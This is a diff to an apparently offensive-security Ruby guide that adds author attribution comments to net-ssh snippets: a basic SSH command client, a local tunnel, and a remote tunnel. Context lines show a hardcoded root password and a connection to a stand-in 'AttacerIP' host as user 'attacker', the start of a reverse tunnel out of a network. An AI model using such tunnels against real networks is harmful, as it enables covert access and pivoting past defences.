@@ -9,6 +9,8 @@ gem install net-ssh
 ## Simple SSH client
 This is a very basic ssh client which sends and executes commands on a remote system 
 ```ruby
+#!/usr/bin/evn ruby
+# KING SABRI | @KINGSABRI
 require 'net/ssh'
 
 @hostname = "localhost"
@@ -44,6 +46,7 @@ Run ssh-ltnnel.rb on the **SSH Server**
 **ssh-ltunnel.rb**
 ```ruby
 #!/usr/bin/evn ruby
+# KING SABRI | @KINGSABRI
 require 'net/ssh'
 
 Net::SSH.start("127.0.0.1", 'root', :password => '123132') do |ssh|
@@ -75,6 +78,7 @@ Run ssh-rtnnel.rb on the **SSH Server**
 **ssh-rtunnel.rb**
 ```ruby
 #!/usr/bin/evn ruby
+# KING SABRI | @KINGSABRI
 require 'net/ssh'
 
 Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|
